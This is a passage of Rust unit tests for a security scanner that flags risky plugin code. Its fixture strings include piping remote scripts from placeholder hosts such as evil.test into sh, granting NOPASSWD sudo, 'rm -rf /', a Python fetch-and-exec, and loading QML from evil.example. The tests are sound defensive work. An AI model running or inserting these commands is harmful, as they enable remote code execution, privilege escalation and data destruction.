            ("Helper.qml", helper_qml.as_bytes().to_vec()),
            ("scripts/lib.js", script_js.as_bytes().to_vec()),
            ("orphan.sh", unreferenced_script.as_bytes().to_vec()),
            ("tools/run.sh", unreferenced_script.as_bytes().to_vec()),
        ];
        let lookup: std::collections::BTreeMap<String, Vec<u8>> = contents
            .into_iter()
            .map(|(path, bytes)| (path.to_owned(), bytes))
            .collect();
        let budget = TimeBudget::default();
        let artifacts = analyze_inventory(
            &mut inventory,
            &|entry| lookup.get(&entry.relative_path).cloned(),
            &budget,
        );

        let targets: Vec<&str> = artifacts
            .edges
            .iter()
            .map(|edge| edge.target_path.as_str())
            .collect();
        assert!(targets.contains(&"Helper.qml"), "{targets:?}");
        assert!(targets.contains(&"scripts/lib.js"), "{targets:?}");
        let helper_index = inventory
            .entries
            .iter()
            .position(|e| e.relative_path == "Helper.qml")
            .unwrap();
        assert!(inventory.entries[helper_index].invocation_target);
        // Shell payloads keep Unsupported but gain the referenced marker only when pointed at.
        assert!(
            !inventory
                .entries
                .iter()
                .any(|e| e.relative_path == "orphan.sh" && e.invocation_target)
        );
        // Traversal and scheme literals never become edges.
        assert!(
            !targets
                .iter()
                .any(|target| target.contains("..") || target.starts_with('/'))
        );
    }

    #[test]
    fn fingerprint_is_end_to_end_deterministic_and_input_sensitive() {
        let make = |command_literal: &str| {
            let source = format!("Process {{ command: [\"sh\", \"-c\", \"{command_literal}\"] }}");
            let mut inventory = PayloadInventory {
                entries: vec![entry("Main.qml", PayloadKind::Qml, source.len())],
                ..Default::default()
            };
            let budget = TimeBudget::default();
            let artifacts = analyze_inventory(
                &mut inventory,
                &|_| Some(source.clone().into_bytes()),
                &budget,
            );
            (artifacts, inventory)
        };
        let (first, inv_first) = make("ls -la");
        let (second, inv_second) = make("ls -la");
        let (different, _) = make("rm -rf /");

        let policy = crate::policy_identity();
        let section_one = AnalysisSection::new(
            policy.clone(),
            crate::fingerprint_analysis(&first.results, &first.capabilities),
            inv_first.limitations.clone(),
            first.rendered_findings(),
            first.capabilities.clone(),
            first.edges.clone(),
            parser_metadata(),
            None,
        );
        let section_two = AnalysisSection::new(
            policy.clone(),
            crate::fingerprint_analysis(&second.results, &second.capabilities),
            inv_second.limitations.clone(),
            second.rendered_findings(),
            second.capabilities.clone(),
            second.edges.clone(),
            parser_metadata(),
            None,
        );
        let section_three = AnalysisSection::new(
            policy,
            crate::fingerprint_analysis(&different.results, &different.capabilities),
            Vec::new(),
            different.rendered_findings(),
            different.capabilities.clone(),
            different.edges.clone(),
            parser_metadata(),
            None,
        );

        let render = |section: &AnalysisSection| {
            serde_json::to_vec(&Report::new(
                "omasafe 0.1.2",
                "2026-01-01T00:00:00Z".to_owned(),
                section,
            ))
            .unwrap()
        };
        // Identical source+policy ⇒ identical analysis bytes modulo envelope.
        assert_eq!(
            section_one.analysis_fingerprint,
            section_two.analysis_fingerprint
        );
        assert_ne!(
            section_one.analysis_fingerprint,
            section_three.analysis_fingerprint
        );
        // Golden pins: canonicalization drift must break these loudly.
        #[cfg(feature = "qml-parser")]
        assert_eq!(
            section_one.analysis_fingerprint,
            "35a35a4182be6e66f3804910b20c27d8dfaea83cbceab0e33e6cb21aa59ff12f"
        );
        #[cfg(not(feature = "qml-parser"))]
        assert_eq!(
            section_one.analysis_fingerprint,
            "e208c0be3311a6ec2c695662c99b5554fa708684c806a161bc91e740d46c20f4"
        );
        let _ = render(&section_one);
    }

    #[test]
    fn exhausted_analysis_budget_is_disclosed_not_fatal() {
        let source = "Process { command: [\"sh\", \"-c\", \"x\"] }";
        let mut inventory = PayloadInventory {
            entries: vec![
                entry("A.qml", PayloadKind::Qml, source.len()),
                entry("B.qml", PayloadKind::Qml, source.len()),
            ],
            ..Default::default()
        };
        let expired = TimeBudget::new(std::time::Duration::ZERO);
        let artifacts = analyze_inventory(
            &mut inventory,
            &|_| Some(source.as_bytes().to_vec()),
            &expired,
        );
        assert!(
            artifacts
                .limitations
                .iter()
                .any(|limitation| limitation == "analysis_time_budget_exhausted")
        );
    }

    #[cfg(not(feature = "qml-parser"))]
    #[test]
    fn fallback_builds_label_qml_conclusions_lexical() {
        let source = "Process { command: [\"sh\", \"-c\", \"curl x | sh\"] }";
        let inventory = PayloadInventory {
            entries: vec![entry("F.qml", PayloadKind::Qml, source.len())],
            ..Default::default()
        };
        let (artifacts, _) = super::tests::analyze_with(inventory, &[("F.qml", source.as_bytes())]);
        assert!(
            artifacts
                .rendered_findings()
                .iter()
                .any(|finding| finding.rule_id == PROCESS_RULE)
        );
        assert!(
            artifacts
                .rendered_findings()
                .iter()
                .all(|finding| finding.confidence.as_deref() == Some("lexical-fallback"))
        );
    }
}

#[cfg(test)]
pub(crate) mod s4_family_tests {
    use super::*;
    use omasafe_core::bounds::TimeBudget;
    use omasafe_report::analysis::AnalysisSection;

    fn entry(path: &str, kind: PayloadKind, size: usize) -> PayloadEntry {
        PayloadEntry {
            relative_path: path.to_owned(),
            kind,
            mode: 0o644,
            size: size as u64,
            sha256_sampled: None,
            sampled_digest: false,
            executable: false,
            coverage_state: CoverageState::Unsupported,
            link_target: None,
            invocation_target: false,
            object_id: None,
        }
    }

    pub(crate) fn run(
        entries: Vec<PayloadEntry>,
        contents: &[(&str, &[u8])],
    ) -> (AnalysisArtifacts, PayloadInventory) {
        let lookup: std::collections::BTreeMap<String, Vec<u8>> = contents
            .iter()
            .map(|(path, bytes)| ((*path).to_owned(), bytes.to_vec()))
            .collect();
        let mut inventory = PayloadInventory {
            entries,
            ..Default::default()
        };
        let artifacts = analyze_inventory(
            &mut inventory,
            &|entry| lookup.get(&entry.relative_path).cloned(),
            &TimeBudget::default(),
        );
        (artifacts, inventory)
    }

    pub(crate) fn rule_ids(artifacts: &AnalysisArtifacts) -> Vec<String> {
        artifacts
            .rendered_findings()
            .iter()
            .map(|finding| finding.rule_id.clone())
            .collect()
    }

    #[test]
    fn priority_surface_imports_are_immediate_high_findings() {
        let source = r#"import QtQuick
import Quickshell.Services.Pam
Item { WlSessionLock { surface: lockSurface } }
"#;
        let (artifacts, inventory) = run(
            vec![entry("Lock.qml", PayloadKind::Qml, source.len())],
            &[("Lock.qml", source.as_bytes())],
        );
        let ids = rule_ids(&artifacts);
        assert!(
            ids.contains(&"oma.qml.pam-authentication".to_owned()),
            "{ids:?}"
        );
        assert!(ids.contains(&"oma.qml.session-lock".to_owned()), "{ids:?}");
        for finding in artifacts.rendered_findings() {
            if finding.rule_id.starts_with("oma.qml.pam")
                || finding.rule_id.starts_with("oma.qml.session")
                || finding.rule_id.starts_with("oma.qml.polkit")
            {
                assert_eq!(finding.severity, "high");
            }
        }
        assert_eq!(inventory.entries[0].coverage_state, CoverageState::Analyzed);
    }

    #[test]
    fn polkit_import_is_a_high_finding_without_usage() {
        let source = "import Quickshell.Services.Polkit\nItem {}\n";
        let (artifacts, _) = run(
            vec![entry("Agent.qml", PayloadKind::Qml, source.len())],
            &[("Agent.qml", source.as_bytes())],
        );
        let findings = artifacts.rendered_findings();
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].rule_id, "oma.qml.polkit-agent-ui");
        assert_eq!(findings[0].severity, "high");
    }

    #[test]
    fn benign_qml_stays_free_of_priority_findings() {
        let source = r#"import QtQuick
Text { text: "hello"; clipboardHelper: false }
Timer { running: true }
"#;
        let (artifacts, _) = run(
            vec![entry("Calm3.qml", PayloadKind::Qml, source.len())],
            &[("Calm3.qml", source.as_bytes())],
        );
        assert!(
            rule_ids(&artifacts).is_empty(),
            "{:?}",
            rule_ids(&artifacts)
        );
    }

    #[test]
    fn dynamic_code_construction_is_detected() {
        let source = r#"Item {
    Component.onCompleted: {
        var panel = Qt.createQmlObject(panelSource, root, "dyn");
        var handler = eval(userInput)
    }
}
"#;
        let (artifacts, _) = run(
            vec![entry("Dyn2.qml", PayloadKind::Qml, source.len())],
            &[("Dyn2.qml", source.as_bytes())],
        );
        let ids = rule_ids(&artifacts);
        assert_eq!(
            ids.iter()
                .filter(|id| *id == "oma.qml.dynamic-code")
                .count(),
            2,
            "both constructions surface: {ids:?}"
        );
        assert!(
            artifacts
                .capabilities
                .iter()
                .any(|capability| capability.capability == "dynamic-code-execution")
        );
    }

    #[test]
    fn encoded_literal_indicator_has_boundary() {
        // Boundary below the threshold stays silent.
        let short = format!("Item {{ property string p: \"{}\" }}", "ab12".repeat(15)); // 60 chars
        let (artifacts_short, _) = run(
            vec![entry("Short.qml", PayloadKind::Qml, short.len())],
            &[("Short.qml", short.as_bytes())],
        );
        assert!(
            !rule_ids(&artifacts_short)
                .contains(&"oma.qml.obfuscated-payload-indicator".to_owned())
        );

        // At/over the threshold with base64 shape surfaces an indicator.
        let long_payload = format!("{}{}{}", "a".repeat(32), "9".repeat(32), "=="); // 66 chars
        let long_source = format!("Item {{ property string p: \"{long_payload}\" }}");
        let (artifacts_long, _) = run(
            vec![entry("Long.qml", PayloadKind::Qml, long_source.len())],
            &[("Long.qml", long_source.as_bytes())],
        );
        let ids = rule_ids(&artifacts_long);
        assert!(
            ids.contains(&"oma.qml.obfuscated-payload-indicator".to_owned()),
            "{ids:?}"
        );

        // Prose of the same length is not base64-shaped.
        let prose = format!("Item {{ property string p: \"{}\" }}", "word ".repeat(20));
        let (artifacts_prose, _) = run(
            vec![entry("Prose.qml", PayloadKind::Qml, prose.len())],
            &[("Prose.qml", prose.as_bytes())],
        );
        assert!(
            !rule_ids(&artifacts_prose)
                .contains(&"oma.qml.obfuscated-payload-indicator".to_owned())
        );
    }

    #[test]
    fn persistence_location_writes_surface_as_context_findings() {
        let source = "FileView { path: \".config/autostart/persist.desktop\" }\n";
        let (artifacts, _) = run(
            vec![entry("Persist.qml", PayloadKind::Qml, source.len())],
            &[("Persist.qml", source.as_bytes())],
        );
        let findings = artifacts.rendered_findings();
        assert!(
            findings
                .iter()
                .any(|finding| finding.rule_id == PERSISTENCE_RULE
                    && finding.severity == "info"
                    && finding.evidence.starts_with("persistence-location"))
        );
    }

    #[test]
    fn shell_download_execute_and_sudoers_are_high_findings() {
        let installer = r#"#!/bin/sh
curl https://example.test/install.sh | sh
echo "NOPASSWD: ALL" > /etc/sudoers.d/omarchy-helper
sudo pacman -S --noconfirm somepackage
"#;
        let (artifacts, inventory) = run(
            vec![entry("install.sh", PayloadKind::Shell, installer.len())],
            &[("install.sh", installer.as_bytes())],
        );
        let ids = rule_ids(&artifacts);
        assert!(
            ids.contains(&"oma.script.download-execute".to_owned()),
            "{ids:?}"
        );
        assert!(
            ids.contains(&"oma.script.privilege-escalation".to_owned()),
            "{ids:?}"
        );
        for finding in artifacts.rendered_findings() {
            if finding.rule_id.starts_with("oma.script.") {
                assert_eq!(finding.severity, "high");
                assert_eq!(finding.confidence.as_deref(), Some("lexical-fallback"));
            }
        }
        // Plain package-manager/sudo usage is capability-level context.
        assert!(
            artifacts
                .capabilities
                .iter()
                .any(|capability| capability.capability == "process-execution")
        );
        // Shell payloads are always labelled partial.
        assert_eq!(inventory.entries[0].coverage_state, CoverageState::Partial);
    }

    #[test]
    fn python_variants_cover_the_same_families() {
        let helper = r#"import urllib.request
data = urllib.request.urlopen("https://example.test/x").read(); exec(data)
sudo pacman -S base-devel
"#;
        let (artifacts, _) = run(
            vec![entry("setup.py", PayloadKind::Python, helper.len())],
            &[("setup.py", helper.as_bytes())],
        );
        let ids = rule_ids(&artifacts);
        assert!(
            ids.contains(&"oma.python.download-execute".to_owned()),
            "{ids:?}"
        );
        // Plain sudo without sudoers/NOPASSWD is a capability, not a finding.
        assert!(
            !ids.contains(&"oma.python.privilege-escalation".to_owned()),
            "{ids:?}"
        );
    }

    #[test]
    fn benign_scripts_have_no_findings_but_stay_partial() {
        let script = "#!/bin/sh\necho hello\nnotify-send done\n";
        let (artifacts, inventory) = run(
            vec![entry("clean.sh", PayloadKind::Shell, script.len())],
            &[("clean.sh", script.as_bytes())],
        );
        assert!(rule_ids(&artifacts).is_empty());
        assert_eq!(inventory.entries[0].coverage_state, CoverageState::Partial);
    }

    #[test]
    fn manifest_kinds_feed_context_results_and_headless_capability() {
        let manifest = br#"{"id":"x","kinds":["bar","service"]}"#;
        let qml_source = "Text {}\n";
        let (artifacts, _) = run(
            vec![
                entry("manifest.json", PayloadKind::TextFile, manifest.len()),
                entry("plugin.qml", PayloadKind::Qml, qml_source.len()),
            ],
            &[
                ("manifest.json", manifest),
                ("plugin.qml", qml_source.as_bytes()),
            ],
        );
        let ids = rule_ids(&artifacts);
        assert!(ids.contains(&REPLACES_BAR_RULE.to_owned()), "{ids:?}");
        let rendered_findings = artifacts.rendered_findings();
        let replaces_bar = rendered_findings
            .iter()
            .find(|finding| finding.rule_id == REPLACES_BAR_RULE)
            .unwrap();
        assert_eq!(replaces_bar.severity, "info");
        assert_eq!(replaces_bar.language, "context");
        assert!(
            artifacts
                .capabilities
                .iter()
                .any(
                    |capability| capability.capability == "persistence-scheduling"
                        && capability.detail == "headless-service-kind"
                )
        );
    }

    #[test]
    fn priority_ordering_puts_critical_and_high_first() {
        let high_source = "import Quickshell.Services.Polkit\nItem {}\n";
        let medium_source = "Process { command: [\"sh\", \"-c\", \"ls\"] }\n";
        let (artifacts, _) = run(
            vec![
                entry("M.qml", PayloadKind::Qml, medium_source.len()),
                entry("H.qml", PayloadKind::Qml, high_source.len()),
            ],
            &[
                ("M.qml", medium_source.as_bytes()),
                ("H.qml", high_source.as_bytes()),
            ],
        );
        let all_findings = artifacts.rendered_findings();
        let severities: Vec<&str> = all_findings
            .iter()
            .map(|finding| finding.severity.as_str())
            .collect();
        let mut sorted = severities.clone();
        let rank = |value: &str| match value {
            "critical" => 4,
            "high" => 3,
            "medium" => 2,
            "low" => 1,
            _ => 0,
        };
        sorted.sort_by_key(|value| std::cmp::Reverse(rank(value)));
        assert_eq!(severities, sorted, "priority ordering violated");
    }

    #[test]
    fn equivalence_map_records_marketplace_baseline_v3() {
        let map = crate::EquivalenceMap::embedded();
        assert_eq!(map.external_ruleset_version, "3");
        assert!(map.is_stale_against("4"));
        let section = AnalysisSection::new(
            crate::policy_identity(),
            String::new(),
            Vec::new(),
            Vec::new(),
            Vec::new(),
            Vec::new(),
            parser_metadata(),
            Some(omasafe_report::analysis::EquivalenceSummary {
                map_version: map.map_version.clone(),
                external_system: map.external_system.clone(),
                external_ruleset_name: map.external_ruleset_name.clone(),
                external_ruleset_version: map.external_ruleset_version.clone(),
            }),
        );
        let rendered = serde_json::to_string(&section).unwrap();
        assert!(rendered.contains("\"external_ruleset_version\":\"3\""));
    }
}

#[cfg(test)]
mod s4_boundary_tests {
    use super::s4_family_tests::{rule_ids, run};
    use super::*;
    use omasafe_core::bounds::TimeBudget;

    fn one(path: &str, kind: PayloadKind, source: &str) -> (AnalysisArtifacts, PayloadInventory) {
        super::s4_family_tests::run(
            vec![entry(path, kind, source.len())],
            &[(path, source.as_bytes())],
        )
    }

    fn entry(path: &str, kind: PayloadKind, size: usize) -> PayloadEntry {
        PayloadEntry {
            relative_path: path.to_owned(),
            kind,
            mode: 0o644,
            size: size as u64,
            sha256_sampled: None,
            sampled_digest: false,
            executable: false,
            coverage_state: CoverageState::Unsupported,
            link_target: None,
            invocation_target: false,
            object_id: None,
        }
    }

    #[test]
    fn base64_indicator_exact_boundaries() {
        let make = |payload: String| {
            let source = format!("Item {{ property string p: \"{payload}\" }}");
            one("B.qml", PayloadKind::Qml, &source)
        };
        // 63 chars: below threshold -> silent.
        let (artifacts63, _) = make("a9".repeat(31) + "a");
        assert!(rule_ids(&artifacts63).is_empty());
        // 64 chars letters+digits: fires.
        let (artifacts64, _) = make("a9".repeat(32));
        assert!(
            rule_ids(&artifacts64).contains(&"oma.qml.obfuscated-payload-indicator".to_owned())
        );
        // Letters-only and digits-only never fire regardless of length.
        let (artifacts_letters, _) = make("a".repeat(70));
        assert!(
            !rule_ids(&artifacts_letters)
                .contains(&"oma.qml.obfuscated-payload-indicator".to_owned())
        );
        let (artifacts_digits, _) = make("7".repeat(70));
        assert!(
            !rule_ids(&artifacts_digits)
                .contains(&"oma.qml.obfuscated-payload-indicator".to_owned())
        );
    }

    #[test]
    fn clipboard_and_compositor_capabilities_surface() {
        let source = r#"Item {
    ClipboardText { onTextChanged: log() }
    HyprlandWorkspace { id: ws }
}
"#;
        let (artifacts, _) = one("Surfaces.qml", PayloadKind::Qml, source);
        let capabilities: Vec<&str> = artifacts
            .capabilities
            .iter()
            .map(|capability| capability.capability.as_str())
            .collect();
        assert!(
            capabilities.contains(&"clipboard-access"),
            "{capabilities:?}"
        );
        assert!(
            capabilities.contains(&"compositor-control"),
            "{capabilities:?}"
        );
        assert!(rule_ids(&artifacts).is_empty(), "capability-only family");
    }

    #[test]
    fn python_privilege_positive_and_readonly_negative() {
        let positive = r#"import os
open("/etc/sudoers.d/x","w").write("%wheel ALL=(ALL) NOPASSWD: ALL")
"#;
        let (artifacts_pos, _) = one("escalate.py", PayloadKind::Python, positive);
        assert!(rule_ids(&artifacts_pos).contains(&"oma.python.privilege-escalation".to_owned()));

        // Read-only inspection is not a grant.
        let negative = "#!/bin/sh\ngrep NOPASSWD /etc/sudoers\n";
        let (artifacts_neg, _) = one("audit.sh", PayloadKind::Shell, negative);
        assert!(!rule_ids(&artifacts_neg).contains(&"oma.script.privilege-escalation".to_owned()));
    }

    #[test]
    fn comment_styles_are_language_exact() {
        // Python: '#' anywhere outside strings starts a comment.
        let py = "x = 1  # curl https://evil.test | sh\n";
        let (artifacts_py, _) = one("c.py", PayloadKind::Python, py);
        assert!(
            rule_ids(&artifacts_py).is_empty(),
            "{:?}",
            rule_ids(&artifacts_py)
        );

        // POSIX shell: '#' needs a word boundary; URLs with #fragments in
        // arguments survive.
        let sh_url = "wget https://example.test/page#section -O out\n";
        let (artifacts_sh, _) = one("u.sh", PayloadKind::Shell, sh_url);
        // wget alone without a pipe-to-interpreter is not download-execute.
        assert!(!rule_ids(&artifacts_sh).contains(&"oma.script.download-execute".to_owned()));

        // JS: `//` after punctuation IS a comment; scheme `://` is not.
        let js = r#"var a = foo(); // eval(userInput)
var url = "https://example.test/x"
"#;
        let (artifacts_js, _) = one("c.js", PayloadKind::JavaScript, js);
        assert!(
            !rule_ids(&artifacts_js)
                .iter()
                .any(|id| id.contains("dynamic-code")),
            "commented eval must stay invisible: {:?}",
            rule_ids(&artifacts_js)
        );
    }

    #[test]
    fn malformed_manifests_are_disclosed_not_silent() {
        let broken = b"{ not json";
        let mut lookup = std::collections::BTreeMap::new();
        lookup.insert("manifest.json".to_owned(), broken.to_vec());
        let mut inventory = PayloadInventory {
            entries: vec![entry("manifest.json", PayloadKind::TextFile, broken.len())],
            ..Default::default()
        };
        let artifacts = analyze_inventory(
            &mut inventory,
            &|entry| lookup.get(&entry.relative_path).cloned(),
            &TimeBudget::default(),
        );
        assert!(
            artifacts
                .limitations
                .iter()
                .any(|limitation| limitation.starts_with("manifest-context-unreadable:"))
        );
    }

    #[test]
    fn ordering_is_severity_first_even_against_alphabetical_order() {
        // Alphabetically-first file carries only a MEDIUM finding;
        // alphabetically-last carries HIGH. Severity must win.
        let medium_source = "Process { command: [\"sh\", \"-c\", \"ls\"] }\n";
        let high_source = "import Quickshell.Services.Polkit\nItem {}\n";
        let (artifacts, _) = run(
            vec![
                entry("aaa.qml", PayloadKind::Qml, medium_source.len()),
                entry("zzz.qml", PayloadKind::Qml, high_source.len()),
            ],
            &[
                ("aaa.qml", medium_source.as_bytes()),
                ("zzz.qml", high_source.as_bytes()),
            ],
        );
        let findings = artifacts.rendered_findings();
        assert_eq!(findings[0].severity, "high", "{findings:?}");
        assert_eq!(findings.last().unwrap().severity, "medium");
    }

    #[test]
    fn within_a_severity_band_order_is_path_then_rule_then_line() {
        // Both files carry a session-lock finding on line 1 and a polkit
        // finding on line 2. Within the High band, path must group m.qml
        // before z.qml and rule id must outrank line number (polkit before
        // session-lock despite its higher line). Emission count varies by
        // parser configuration (import + surface evidences), so ordering is
        // asserted over ranks rather than an exact multiset.
        let source =
            "import Quickshell.WlSessionLock\nimport Quickshell.Services.Polkit\nItem {}\n";
        let (artifacts, _) = run(
            vec![
                entry("m.qml", PayloadKind::Qml, source.len()),
                entry("z.qml", PayloadKind::Qml, source.len()),
            ],
            &[("m.qml", source.as_bytes()), ("z.qml", source.as_bytes())],
        );
        let rendered = artifacts.rendered_findings();
        assert!(
            rendered.iter().all(|finding| finding.severity == "high"),
            "both rules are High: {rendered:?}"
        );
        assert!(rendered.len() >= 4, "{rendered:?}");
        // The interesting inversion exists: m.qml polkit@2 precedes
        // m.qml session-lock@1.
        let contains = |path: &str, rule: &str, line: u32| {
            rendered.iter().any(|finding| {
                finding.relative_path == path
                    && finding.rule_id == rule
                    && finding.line == Some(line)
            })
        };
        assert!(
            contains("m.qml", "oma.qml.polkit-agent-ui", 2),
            "{rendered:?}"
        );
        assert!(contains("m.qml", "oma.qml.session-lock", 1), "{rendered:?}");
        assert!(
            contains("z.qml", "oma.qml.polkit-agent-ui", 2),
            "{rendered:?}"
        );
        assert!(contains("z.qml", "oma.qml.session-lock", 1), "{rendered:?}");
        let rank = |path: &str, rule: &str| -> (usize, usize) {
            (
                usize::from(path == "z.qml"),
                usize::from(rule != "oma.qml.polkit-agent-ui"),
            )
        };
        let keys: Vec<(usize, usize, u32)> = rendered
            .iter()
            .map(|finding| {
                let (path_rank, rule_rank) = rank(&finding.relative_path, &finding.rule_id);
                (path_rank, rule_rank, finding.line.unwrap_or(0))
            })
            .collect();
        let mut sorted = keys.clone();
        sorted.sort();
        assert_eq!(
            keys, sorted,
            "band order must be path, then rule, then line"
        );
    }

    #[test]
    fn quoted_comment_markers_stay_inert_and_live_code_survives() {
        // The cursor must advance past an opening quote: markers inside
        // strings are inert AND live code after them is still scanned.
        assert_eq!(
            strip_line_comment(r#"var t = "a // b"; eval(x)"#, CommentStyle::DoubleSlash),
            r#"var t = "a // b"; eval(x)"#
        );
        assert_eq!(
            strip_line_comment(r#"var s = 'x \' y'; eval(z)"#, CommentStyle::DoubleSlash),
            r#"var s = 'x \' y'; eval(z)"#
        );
        assert_eq!(
            strip_line_comment("'# literal'; exec(x)", CommentStyle::PythonHash),
            "'# literal'; exec(x)"
        );
        // Shell comments start at control-operator word boundaries too.
        assert_eq!(
            strip_line_comment("true;# curl x | sh", CommentStyle::ShellHash),
            "true;"
        );
        assert_eq!(
            strip_line_comment("foo & # trailing", CommentStyle::ShellHash),
            "foo & "
        );
        assert_eq!(
            strip_line_comment("${var#pattern} stays", CommentStyle::ShellHash),
            "${var#pattern} stays"
        );
    }

    #[test]
    fn live_code_after_quoted_markers_is_still_scanned() {
        let js = r#"var t = "not // a comment"; eval(userInput)
"#;
        let (artifacts, _) = one("q.js", PayloadKind::JavaScript, js);
        let ids = rule_ids(&artifacts);
        assert!(ids.contains(&DYNAMIC_CODE_RULE.to_owned()), "{ids:?}");
    }

    #[test]
    fn shell_comments_after_control_operators_are_inert() {
        let sh = "#!/bin/sh\ntrue;# curl https://evil.test/x | sh\nnotify-send ready\n";
        let (artifacts, _) = one("guarded.sh", PayloadKind::Shell, sh);
        let ids = rule_ids(&artifacts);
        assert!(
            !ids.contains(&"oma.script.download-execute".to_owned()),
            "{ids:?}"
        );
    }

    #[test]
    fn new_function_is_detected_on_lexical_and_ast_paths_separately() {
        // Standalone JS: always lexical.
        let js = "var f = new Function(payload)\n";
        let (artifacts_js, _) = one("dyn.js", PayloadKind::JavaScript, js);
        assert!(rule_ids(&artifacts_js).contains(&DYNAMIC_CODE_RULE.to_owned()));

        #[cfg(feature = "qml-parser")]
        {
            // AST-backed QML: same family through the parser, labelled
            // ast-backed rather than lexical-fallback.
            let qml = "Item { Component.onCompleted: var f = new Function(payload) }\n";
            let (artifacts_qml, _) = one("Dyn.qml", PayloadKind::Qml, qml);
            let dynamic = artifacts_qml
                .results
                .iter()
                .find(|result| result.rule_id() == DYNAMIC_CODE_RULE);
            assert!(dynamic.is_some(), "AST path must detect new Function");
            assert_eq!(dynamic.unwrap().confidence(), Some(Confidence::AstBacked));
        }
    }

    #[test]
    fn every_readonly_first_word_suppresses_privilege_findings() {
        for word in ["grep", "cat", "less", "head", "tail", "stat", "journalctl"] {
            for command in [
                format!("{word} NOPASSWD /etc/sudoers"),
                format!("/usr/bin/{word} NOPASSWD /etc/sudoers"),
            ] {
                let source = format!("{command}\n");
                let (artifacts, _) = one("audit.sh", PayloadKind::Shell, &source);
                let ids = rule_ids(&artifacts);
                assert!(
                    !ids.contains(&"oma.script.privilege-escalation".to_owned()),
                    "{command} must stay capability-level: {ids:?}"
                );
            }
        }
    }

    #[test]
    fn non_writing_privilege_mentions_are_never_grants() {
        // A NOPASSWD mention with no write context is not a grant.
        let sh = "#!/bin/sh\necho NOPASSWD /etc/sudoers\nprintf '%s\\n' done\n";
        let (artifacts_sh, _) = one("echo.sh", PayloadKind::Shell, sh);
        let ids_sh = rule_ids(&artifacts_sh);
        assert!(
            !ids_sh.contains(&"oma.script.privilege-escalation".to_owned()),
            "{ids_sh:?}"
        );
        // Python read mode never writes policy.
        let py = "text = open(\"/etc/sudoers\", \"r\").read()\nprint(text.find(\"NOPASSWD\"))\n";
        let (artifacts_py, _) = one("read.py", PayloadKind::Python, py);
        let ids_py = rule_ids(&artifacts_py);
        assert!(
            !ids_py.contains(&"oma.python.privilege-escalation".to_owned()),
            "{ids_py:?}"
        );
    }

    #[test]
    fn quoted_spellings_do_not_create_high_findings() {
        // The whole pipe lives inside a string literal: no provenance.
        let sh = "#!/bin/sh\nlog 'curl https://example.test/x | sh'\nnotify-send done\n";
        let (artifacts_sh, _) = one("quote.sh", PayloadKind::Shell, sh);
        let ids_sh = rule_ids(&artifacts_sh);
        assert!(
            !ids_sh.contains(&"oma.script.download-execute".to_owned()),
            "{ids_sh:?}"
        );

        // Python fetch and sink spellings inside string values only.
        let py = "log('requests.get then os.system')\n";
        let (artifacts_py, _) = one("lit.py", PayloadKind::Python, py);
        let ids_py = rule_ids(&artifacts_py);
        assert!(
            !ids_py.contains(&"oma.python.download-execute".to_owned()),
            "{ids_py:?}"
        );

        // Dynamic-code spelling inside a quoted value is capability-level.
        let js = "var s = \"new Function(payload)\";\n";
        let (artifacts_js, _) = one("lit.js", PayloadKind::JavaScript, js);
        let ids_js = rule_ids(&artifacts_js);
        assert!(
            !ids_js.contains(&DYNAMIC_CODE_RULE.to_owned()),
            "{ids_js:?}"
        );
    }
}

#[cfg(test)]
mod h2_reference_tests {
    use super::s4_family_tests::{rule_ids, run};
    use super::*;
    use omasafe_core::bounds::TimeBudget;

    fn entry(path: &str, kind: PayloadKind, size: usize) -> PayloadEntry {
        PayloadEntry {
            relative_path: path.to_owned(),
            kind,
            mode: 0o644,
            size: size as u64,
            sha256_sampled: None,
            sampled_digest: false,
            executable: false,
            coverage_state: CoverageState::Unsupported,
            link_target: None,
            invocation_target: false,
            object_id: None,
        }
    }

    fn one(path: &str, kind: PayloadKind, source: &str) -> (AnalysisArtifacts, PayloadInventory) {
        super::s4_family_tests::run(
            vec![entry(path, kind, source.len())],
            &[(path, source.as_bytes())],
        )
    }

    fn rejection_limitations(artifacts: &AnalysisArtifacts) -> Vec<&String> {
        artifacts
            .limitations
            .iter()
            .filter(|limitation| limitation.starts_with("sink-reference-rejected:"))
            .collect()
    }

    #[test]
    fn literal_remote_loader_source_is_a_high_finding() {
        let source = r#"import QtQuick
Item {
    Loader { source: "https://evil.example/W.qml" }
}
"#;
        let (artifacts, _) = one("R.qml", PayloadKind::Qml, source);
        let findings = artifacts.rendered_findings();
        let remote: Vec<_> = findings
            .iter()
            .filter(|finding| finding.rule_id == REMOTE_COMPONENT_LOAD_RULE)
            .collect();
        assert_eq!(remote.len(), 1, "{findings:?}");
        assert_eq!(remote[0].severity, "high");
        assert!(
            remote[0]
                .evidence
                .starts_with("remote-component-load:Loader.source:https://evil.example/W.qml"),
            "{}",
            remote[0].evidence
        );
        // The finding is the disclosure: no sink rejection on top.
        assert!(rejection_limitations(&artifacts).is_empty());
        #[cfg(feature = "qml-parser")]
        assert_eq!(remote[0].confidence.as_deref(), Some("ast-backed"));
        #[cfg(not(feature = "qml-parser"))]
        assert_eq!(remote[0].confidence.as_deref(), Some("lexical-fallback"));
    }

    #[test]
    fn remote_create_component_is_a_high_finding_with_dynamic_code() {
        let source = r#"import QtQuick
Item {
    Component.onCompleted: {
        var c = Qt.createComponent("https://evil.example/W.qml")
    }
}
"#;
        let (artifacts, _) = one("C.qml", PayloadKind::Qml, source);
        let findings = artifacts.rendered_findings();
        let remote: Vec<_> = findings
            .iter()
            .filter(|finding| finding.rule_id == REMOTE_COMPONENT_LOAD_RULE)
            .collect();
        assert_eq!(remote.len(), 1, "{findings:?}");
        assert_eq!(remote[0].severity, "high");
        assert!(
            remote[0]
                .evidence
                .starts_with("remote-component-load:Qt.createComponent:https://"),
            "{}",
            remote[0].evidence
        );
        assert!(
            findings
                .iter()
                .any(|finding| finding.rule_id == DYNAMIC_CODE_RULE),
            "createComponent joins the dynamic-code family: {findings:?}"
        );
        assert!(
            artifacts
                .capabilities
                .iter()
                .any(|capability| capability.capability == "dynamic-code-execution"),
            "{:?}",
            artifacts.capabilities
        );
    }

    #[test]
    fn remote_directory_import_is_indicator_only() {
        // H0 probe C: remote directory imports are scanner-intercepted on the
        // pinned runtime. Both `as`-qualified and bare spellings record the
        // indicator and must never carry the High remote-load rule.
        let source = r#"import QtQuick
import "https://plugins.example/remote/qml" as Remote
import "https://plugins.example/bare"
Item {}
"#;
        let (artifacts, _) = one("I.qml", PayloadKind::Qml, source);
        let findings = artifacts.rendered_findings();
        assert_eq!(findings.len(), 2, "{findings:?}");
        assert!(
            findings
                .iter()
